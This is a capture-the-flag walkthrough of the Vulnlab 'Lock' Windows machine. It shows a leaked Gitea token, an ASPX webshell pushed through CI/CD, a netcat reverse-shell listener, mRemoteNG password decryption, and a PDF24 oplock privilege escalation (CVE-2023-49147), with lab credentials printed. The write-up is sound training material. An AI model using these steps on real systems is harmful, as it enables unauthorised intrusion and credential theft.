---
title: "Lock"
---

# Vulnlab - Lock Writeup


![Cap dashboard screenshot](Lock.png)

Hello guys, I’ll be walking you through the attack vectors and findings for the retired box **Lock**. This machine starts with a Gitea instance where I’ll find an API token in an old commit. I’ll use that to access a private repo for the website. The repo is set up with CI/CD, so when the repository changes, the production website gets updated automatically. From there, I’ll add an ASPX webshell and get a foothold on the box. I’ll then find an mRemoteNG config file and decrypt it to recover the next user’s password and RDP access. Finally, I’ll exploit a vulnerability in the PDF24 installer repair functionality by locking a log file it wants to write, running the repair process, and turning a hanging `cmd.exe` into a SYSTEM shell.

## Recon

I started with a full port scan to see what services were exposed on the target.

```bash
nmap -p- -vvv -sV --min-rate 10000 Target-IP
```

The first scan showed four open ports:

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-15 20:24 UTC
Nmap scan report for 10.129.234.64
Host is up (0.091s latency).

PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Lock - Index
445/tcp  open  microsoft-ds?
3000/tcp open  ppp?
| fingerprint-strings:
|   GenericLines, Help, RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Content-Type: text/html; charset=utf-8
|     Set-Cookie: i_like_gitea=2212747db187de4d; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=Ip28VVc-sj5pyfscTYff-l6raHQ6MTc1NTI4OTQ3NzM5NzkwMDUwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Fri, 15 Aug 2025 20:24:37 GMT
|     <!DOCTYPE html>
|     <html lang="en-US" class="theme-auto">
|     <head>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <title>Gitea: Git with a cup of tea</title>
|     <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwOi8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9wbmciLCJzaXplcyI6IjU
|   HTTPOptions:
|     HTTP/1.0 405 Method Not Allowed
|     Allow: HEAD
|     Allow: HEAD
|     Allow: GET
|     Cache-Control: max-age=0, private, must-revalidate, no-transform
|     Set-Cookie: i_like_gitea=7e9cbbabd1bd8fba; Path=/; HttpOnly; SameSite=Lax
|     Set-Cookie: _csrf=oXtAV8JGDSCEr5-B8W17rXg_dyU6MTc1NTI4OTQ4MzE3NzE2NzUwMA; Path=/; Max-Age=86400; HttpOnly; SameSite=Lax
|     X-Frame-Options: SAMEORIGIN
|     Date: Fri, 15 Aug 2025 20:24:43 GMT
|_    Content-Length: 0
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-08-15T20:26:41+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=Lock
| Not valid before: 2025-04-15T00:34:47
|_Not valid after:  2025-10-15T00:34:47
| rdp-ntlm-info:
|   Target_Name: LOCK
|   NetBIOS_Domain_Name: LOCK
|   NetBIOS_Computer_Name: LOCK
|   DNS_Domain_Name: Lock
|   DNS_Computer_Name: Lock
|   Product_Version: 10.0.20348
|_  System_Time: 2025-08-15T20:26:01+00:00
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.94SVN%I=7%D=8/15%Time=689F9784%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(GetRequest,3000,"HTTP/1\.0\x20200\x20OK\r\nCache-Contr
SF:ol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\nCo
SF:ntent-Type:\x20text/html;\x20charset=utf-8\r\nSet-Cookie:\x20i_like_git
SF:ea=2212747db187de4d;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Coo
SF:kie:\x20_csrf=Ip28VVc-sj5pyfscTYff-l6raHQ6MTc1NTI4OTQ3NzM5NzkwMDUwMA;\x
SF:20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Opt
SF:ions:\x20SAMEORIGIN\r\nDate:\x20Fri,\x2015\x20Aug\x202025\x2020:24:37\x
SF:20GMT\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en-US\"\x20class=\"the
SF:me-auto\">\n<head>\n\t<meta\x20name=\"viewport\"\x20content=\"width=dev
SF:ice-width,\x20initial-scale=1\">\n\t<title>Gitea:\x20Git\x20with\x20a\x
SF:20cup\x20of\x20tea</title>\n\t<link\x20rel=\"manifest\"\x20href=\"data:
SF:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHR
SF:lYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3Rhcn
SF:RfdXJsIjoiaHR0cDovL2xvY2FsaG9zdDozMDAwLyIsImljb25zIjpbeyJzcmMiOiJodHRwO
SF:i8vbG9jYWxob3N0OjMwMDAvYXNzZXRzL2ltZy9sb2dvLnBuZyIsInR5cGUiOiJpbWFnZS9w
SF:bmciLCJzaXplcyI6IjU")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n
SF:Content-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r
SF:\n\r\n400\x20Bad\x20Request")%r(HTTPOptions,1A4,"HTTP/1\.0\x20405\x20Me
SF:thod\x20Not\x20Allowed\r\nAllow:\x20HEAD\r\nAllow:\x20HEAD\r\nAllow:\x2
SF:0GET\r\nCache-Control:\x20max-age=0,\x20private,\x20must-revalidate,\x2
SF:0no-transform\r\nSet-Cookie:\x20i_like_gitea=7e9cbbabd1bd8fba;\x20Path=
SF:/;\x20HttpOnly;\x20SameSite=Lax\r\nSet-Cookie:\x20_csrf=oXtAV8JGDSCEr5-
SF:B8W17rXg_dyU6MTc1NTI4OTQ4MzE3NzE2NzUwMA;\x20Path=/;\x20Max-Age=86400;\x
SF:20HttpOnly;\x20SameSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\
SF:x20Fri,\x2015\x20Aug\x202025\x2020:24:43\x20GMT\r\nContent-Length:\x200
SF:\r\n\r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nCont
SF:ent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r
SF:\n400\x20Bad\x20Request");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-08-15T20:26:03
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 132.16 seconds
```
The most interesting results were Microsoft IIS on port 80, Gitea on port 3000, and RDP on port 3389. The TTL of 127 also matched a Windows host that was one hop away.

### Website Enumeration

The site on port 80 was a basic company page advertising document editing services. All of the links just jumped to sections on the same page, so there was nothing else to enumerate there. The response headers showed the site was running ASP.NET behind IIS:

![Cap dashboard screenshot](Lock-1.webp)

```text
HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Thu, 28 Dec 2023 14:07:59 GMT
Accept-Ranges: bytes
ETag: "675cb2439739da1:0"
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
```

I also ran directory brute force against the site using a lowercase wordlist and HTML extension support.

```bash
feroxbuster -u http://10.129.234.64 -x html -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt --dont-extract-links
```

That scan mostly returned the expected static content and a handful of default IIS-related directories, but nothing that looked useful for initial access.

### Gitea Enumeration

The service on port 3000 was a Gitea instance. Under “Explore”, there was one public repository, and that repository turned out to be the key to the whole box.

![Cap dashboard screenshot](lock-2.webp)

The Explorer : 

![Cap dashboard screenshot](lock-3.webp)

The public repo contained a Python script used to query the Gitea API. The current version reads the token from an environment variable:

```python
import requests
import sys
import os

def format_domain(domain):
    if not domain.startswith(('http://', 'https://')):
        domain = 'https://' + domain
    return domain

def get_repositories(token, domain):
    headers = {
        'Authorization': f'token {token}'
    }
    url = f'{domain}/api/v1/user/repos'
    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        return response.json()
    else:
        raise Exception(f'Failed to retrieve repositories: {response.status_code}')

def main():
    if len(sys.argv) < 2:
        print("Usage: python script.py <gitea_domain>")
        sys.exit(1)

    gitea_domain = format_domain(sys.argv[1])

    personal_access_token = os.getenv('GITEA_ACCESS_TOKEN')
    if not personal_access_token:
        print("Error: GITEA_ACCESS_TOKEN environment variable not set.")
        sys.exit(1)

    try:
        repos = get_repositories(personal_access_token, gitea_domain)
        print("Repositories:")
        for repo in repos:
            print(f"- {repo['full_name']}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
```

But an older commit showed that the token was once hardcoded in the file. That was the break I needed.

![Cap dashboard screenshot](lock-4.png)

I exported the leaked token and used it to query the API directly.

```bash
export GITEA_ACCESS_TOKEN=43ce39bb0bd6bc489284f2905f033ca467a6362f
python repos.py http://10.129.234.64:3000
```

That returned two repositories:

```text
Repositories:
- ellen.freeman/dev-scripts
- ellen.freeman/website
```

I could also query the API directly with curl:

```bash
curl http://Target-IP:3000/api/v1/user/repos -H "Authorization: Bearer 43ce39bb0bd6bc489284f2905f033ca467a6362f" -s | jq .
```

The response showed that `ellen.freeman/website` was private, which made it the most interesting target.

The Gitea API also exposed repository contents. I listed the files in the private repo first:

```bash
curl http://Target-IP:3000/api/v1/repos/ellen.freeman/website/contents -H "Authorization: Bearer 43ce39bb0bd6bc489284f2905f033ca467a6362f" -s | jq -r .[].name
```

That returned:

```text
assets
changelog.txt
index.html
readme.md
```

I fetched the README next:

```bash
curl http://Target-IP:3000/api/v1/repos/ellen.freeman/website/contents/readme.md -H "Authorization: Bearer 43ce39bb0bd6bc489284f2905f033ca467a6362f" -s | jq .content -r | base64 -d
```

The file explained that CI/CD was active and that any change to the repository would automatically be deployed to the production web server. That immediately suggested a webshell deployment path.

## Initial Access

Since the target site was ASP.NET, I grabbed an ASPX webshell and added it to the repository.
. https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx
. https://github.com/xl7dev/WebShell/blob/master/Aspx/ASPX%20Shell.aspx
### Foothold

```bash
git status
git add shell.aspx
git commit -m "rev shell"
git push
```

The push succeeded, and the CI/CD pipeline deployed my changes to the live site within a few seconds.

From there, I accessed the uploaded ASPX file and used it to execute a PowerShell reverse shell. I set up a listener first:

```bash
rlwrap nc -lnvp 2323
```
Generate a powershell reveres shell: https://www.revshells.com/

![Cap dashboard screenshot](revShell.png)

Then I used the webshell to trigger the callback. The shell connected back to me successfully:

```text
Connection received on 10.129.234.64 65320
PS C:\inetpub\wwwroot> whoami
lock\ellen.freeman
```

That gave me a foothold as `ellen.freeman`.

## Internal Enumeration

Once I had a shell, I started looking around the system for other users and any files that might help with privilege escalation.

There was one other interesting non-admin user with a home directory under `C:\Users`:

```powershell
PS C:\Users> ls

    Directory: C:\Users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----        12/27/2023   2:00 PM                .NET v4.5
d-----        12/27/2023   2:00 PM                .NET v4.5 Classic
d-----        12/27/2023  12:01 PM                Administrator
d-----        12/28/2023  11:36 AM                ellen.freeman
d-----        12/28/2023   6:14 AM                gale.dekarios
d-r---        12/27/2023  10:21 AM                Public
```

The `ellen.freeman` profile was accessible, and the `tree` output showed a few interesting files and directories:

```powershell
PS C:\Users> tree /f .
```

```text
Folder PATH listing
Volume serial number is 0000022C 8592:A9D9
C:\USERS
+---.NET v4.5
+---.NET v4.5 Classic
+---Administrator
+---ellen.freeman
?   ?   .git-credentials
?   ?   .gitconfig
?   ?   
?   +---.ssh
?   ?       authorized_keys
?   ?       
?   +---3D Objects
?   +---Contacts
?   +---Desktop
?   +---Documents
?   ?       config.xml
?   ?       
?   +---Downloads
?   +---Favorites
?   ?   ?   Bing.url
?   ?   ?   
?   ?   +---Links
?   ?   ?   Desktop.lnk
?   ?   ?   Downloads.lnk
?   ?   +---Links
?   ?       Desktop.lnk
?   ?       Downloads.lnk
?   +---Music
?   +---Pictures
?   +---Saved Games
?   +---Searches
?   +---Videos
+---gale.dekarios
+---Public
    +---Documents
    +---Downloads
    +---Music
    +---Pictures
    +---Videos
```

There was nothing useful in `Public`, but `gale.dekarios` had a home directory too, and the `Documents` folder contained a file named `config.xml`.

### mRemoteNG Credentials

The `config.xml` file was an mRemoteNG connection configuration file. The XML made that obvious because it referenced the mRemoteNG format directly:

```xml
<?xml version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="sDkrKn0JrG4oAL4GW8BctmMNAJfcdu/ahPSQn3W5DPC3vPRiNwfo7OH11trVPbhwpy+1FnqfcPQZ3olLRy+DhDFp" ConfVersion="2.6">
    <Node Name="RDP/Gale" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="a179606a-a854-48a6-9baa-491d8eb3bddc" Username="Gale.Dekarios" Domain="" Password="TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw==" Hostname="Lock" Protocol="RDP" PuttySession="Default Settings" Port="3389" ConnectToConsole="false" UseCredSsp="true" RenderingEngine="IE" ICAEncryptionStrength="EncrBasic" RDPAuthenticationLevel="NoAuth" RDPMinutesToIdleTimeout="0" RDPAlertIdleTimeout="false" LoadBalanceInfo="" Colors="Colors16Bit" Resolution="FitToWindow" AutomaticResize="true" DisplayWallpaper="false" DisplayThemes="false" EnableFontSmoothing="false" EnableDesktopComposition="false" CacheBitmaps="false" RedirectDiskDrives="false" RedirectPorts="false" RedirectPrinters="false" RedirectSmartCards="false" RedirectSound="DoNotPlay" SoundQuality="Dynamic" RedirectKeys="false" Connected="false" PreExtApp="" PostExtApp="" MacAddress="" UserField="" ExtApp="" VNCCompression="CompNone" VNCEncoding="EncHextile" VNCAuthMode="AuthVNC" VNCProxyType="ProxyNone" VNCProxyIP="" VNCProxyPort="0" VNCProxyUsername="" VNCProxyPassword="" VNCColors="ColNormal" VNCSmartSizeMode="SmartSAspect" VNCViewOnly="false" RDGatewayUsageMethod="Never" RDGatewayHostname="" RDGatewayUseConnectionCredentials="Yes" RDGatewayUsername="" RDGatewayPassword="" RDGatewayDomain="" InheritCacheBitmaps="false" InheritColors="false" InheritDescription="false" InheritDisplayThemes="false" InheritDisplayWallpaper="false" InheritEnableFontSmoothing="false" InheritEnableDesktopComposition="false" InheritDomain="false" InheritIcon="false" InheritPanel="false" InheritPassword="false" InheritPort="false" InheritProtocol="false" InheritPuttySession="false" InheritRedirectDiskDrives="false" InheritRedirectKeys="false" InheritRedirectPorts="false" InheritRedirectPrinters="false" InheritRedirectSmartCards="false" InheritRedirectSound="false" InheritSoundQuality="false" InheritResolution="false" InheritAutomaticResize="false" InheritUseConsoleSession="false" InheritUseCredSsp="false" InheritRenderingEngine="false" InheritUsername="false" InheritICAEncryptionStrength="false" InheritRDPAuthenticationLevel="false" InheritRDPMinutesToIdleTimeout="false" InheritRDPAlertIdleTimeout="false" InheritLoadBalanceInfo="false" InheritPreExtApp="false" InheritPostExtApp="false" InheritMacAddress="false" InheritUserField="false" InheritExtApp="false" InheritVNCCompression="false" InheritVNCEncoding="false" InheritVNCAuthMode="false" InheritVNCProxyType="false" InheritVNCProxyIP="false" InheritVNCProxyPort="false" InheritVNCProxyUsername="false" InheritVNCProxyPassword="false" InheritVNCColors="false" InheritVNCSmartSizeMode="false" InheritVNCViewOnly="false" InheritRDGatewayUsageMethod="false" InheritRDGatewayHostname="false" InheritRDGatewayUseConnectionCredentials="false" InheritRDGatewayUsername="false" InheritRDGatewayPassword="false" InheritRDGatewayDomain="false" />
</mrng:Connections>
```

That connection entry referenced `Gale.Dekarios` and an RDP session back to the host, but the password was encrypted.


I Transffer the Config.xml file and decrypted the mRemoteNG config locally using a public decryption script.: https://github.com/haseebT/mRemoteNG-Decrypt/blob/master/mremoteng_decrypt.py

```bash
python3 mremoteng_decrypt.py -rf config.xml
```

That recovered the username, host, and password:

```text
Username: Gale.Dekarios
Hostname: Lock
Password: ty8wnW9qCKDosXo6
```

## RDP Access

With the decrypted credentials, I moved to RDP. Rather than just logging in manually, I also tested command execution over RDP with `netexec`.

```bash
netexec rdp Target-IP -u gale.dekarios -p ty8wnW9qCKDosXo6 -x "type C:\\users\\gale.dekarios\\desktop\\user.txt"
```

That worked and returned the user flag:

```text
RDP         10.129.234.64   3389   LOCK             [*] Windows 10 or Windows Server 2016 Build 20348 (name:LOCK) (domain:Lock) (nla:False)
RDP         10.129.234.64   3389   LOCK             [+] Lock\gale.dekarios:ty8wnW9qCKDosXo6 (Pwn3d!)
RDP         10.129.234.64   3389   LOCK             [+] Executing command: type C:\users\gale.dekarios\desktop\user.txt with delay 5 seconds
RDP         10.129.234.64   3389   LOCK             [+] Waiting for clipboard to be ready...
RDP         10.129.234.64   3389   LOCK             [+] Clipboard is ready, proceeding with command execution
RDP         10.129.234.64   3389   LOCK             **********
```

I also opened an interactive session with RDP:

```bash
xfreerdp /u:gale.dekarios /p:ty8wnW9qCKDosXo6 /v:Target-IP:3389 +clipboard
```

The session worked, and `user.txt` was also available from there.

## Privilege Escalation

On the desktop, I found shortcuts for mRemoteNG and PDF24. Opening mRemoteNG showed no saved connections, which I confirmed by checking the config file in the user profile:

```powershell
PS C:\Users\gale.dekarios\AppData\Roaming\mRemoteNG> cat .\confCons.xml
```

```xml
<?xml version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="cAtqNd+DCe9vkHsFg8e3wxP7d5IkENeUiK+43JVHtRVtkY0EjkGEeA37qeEZFZjcnotghJTMwuKalATtfp7cQX6G" ConfVersion="2.6" />
```

PDF24 was installed in `C:\Program Files`, and the binary version was `11.15.1`:

```powershell
PS C:\Program Files> Get-ChildItem .\pdf24.exe | Format-List VersionInfo
```

```text
VersionInfo : File:             C:\Program Files\PDF24\pdf24.exe
              InternalName:     PDF24 Backend
              OriginalFilename: pdf24.exe
              FileVersion:      11.15.1
              FileDescription:  PDF24 Backend
              Product:          PDF24 Creator
              ProductVersion:   11.15.1
              Debug:            False
              Patched:           False
              PreRelease:        False
              PrivateBuild:      False
              SpecialBuild:      False
              Language:          English (United States)
```

That matched the vulnerable version tied to CVE-2023-49147.: https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/ The issue involves the PDF24 installer repair flow opening a visible `cmd.exe` window while trying to write to a log file, which can be abused with an oplock to trap the process and pivot into SYSTEM.

I created the oplock on the log file using `SetOpLock.exe`:

```powershell
PS C:\Users\gale.dekarios> .\SetOpLock.exe "C:\Program Files\PDF24\faxPrnInst.log" r
```

Then I located the installer in the hidden `_install` directory at the root of the drive:

```powershell
PS C:\> ls -force
```

```text
d--h--         4/15/2025   5:36 PM                $WinREAgent
d-----        12/27/2023  11:11 AM                Gitea
d-----         4/15/2025   5:56 PM                inetpub
d--h--        12/28/2023  11:23 AM                _install
```

The installer was present there:

```powershell
PS C:\_install> ls
```

```text
Directory: C:\_install

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        12/28/2023  11:21 AM       60804608 Firefox Setup 121.0.msi
-a----        12/28/2023   5:39 AM       43593728 mRemoteNG-Installer-1.76.20.24615.msi
-a----        12/14/2023  10:07 AM      462602240 pdf24-creator-11.15.1-x64.msi
```

I launched the repair process and selected the repair option through the GUI, or equivalently with msiexec:

![Cap dashboard screenshot](lock-5.png)

```powershell
PS C:\_install> msiexec.exe /fa .\pdf24-creator-11.15.1-x64.msi
```

Near the end of the repair, `pdf24-PrinterInstall.exe` opened a hanging `cmd.exe` window. That was the critical moment.

![Cap dashboard screenshot](lock-6.png)

From there, I opened the console properties and switched to legacy console mode.

![Cap dashboard screenshot](lock-7.png)

![Cap dashboard screenshot](lock-8.png)

Then I used the Open dialog trick to launch `cmd.exe` directly under the SYSTEM context.

![Cap dashboard screenshot](lock-9.png)

![Cap dashboard screenshot](lock-10.png)

![Cap dashboard screenshot](lock-11.png)

Once the new shell appeared, I verified it was running as SYSTEM and read the root flag:

```powershell
C:\Users\Administrator\Desktop>type root.txt
********
```

## Attack Path

- **Scan the host** - and identify HTTP, Gitea, SMB, and RDP.
- **Enumerate the Gitea instance** - and find an old commit containing a leaked API token.
- **Use the token** - to access the private website repository.
- **Confirm CI/CD deployment** - and use it to upload an ASPX webshell.
- **Gain a foothold** - on the target as `ellen.freeman`.
- **Enumerate local users** - and find `gale.dekarios`.
- **Recover an mRemoteNG config file** - and decrypt the saved RDP credentials.
- **Use the credentials** - to RDP as `gale.dekarios`.
- **Identify the vulnerable PDF24 version** - and prepare the oplock exploit.
- **Lock the log file** - and trigger the PDF24 repair workflow.
- **Abuse the hanging `cmd.exe` window** - to open a SYSTEM shell.
- **Read the root flag** - and complete the machine.
